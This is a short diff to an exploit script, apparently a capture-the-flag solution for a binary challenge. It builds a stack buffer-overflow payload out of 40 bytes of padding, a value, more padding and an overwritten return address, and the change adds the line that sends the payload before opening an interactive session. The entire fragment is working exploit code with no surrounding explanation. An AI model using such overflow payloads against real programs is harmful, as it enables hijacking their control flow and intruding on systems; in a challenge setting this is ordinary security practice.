@@ -18,4 +18,5 @@ io.recvuntil("mining today?")
 
 injection = 'A' * 40 + value_str + 8 * 'A' + '\x84\x12\x40\x00\x00\x00\x00\x00'
 
+io.sendline(injection)
 io.interactive()
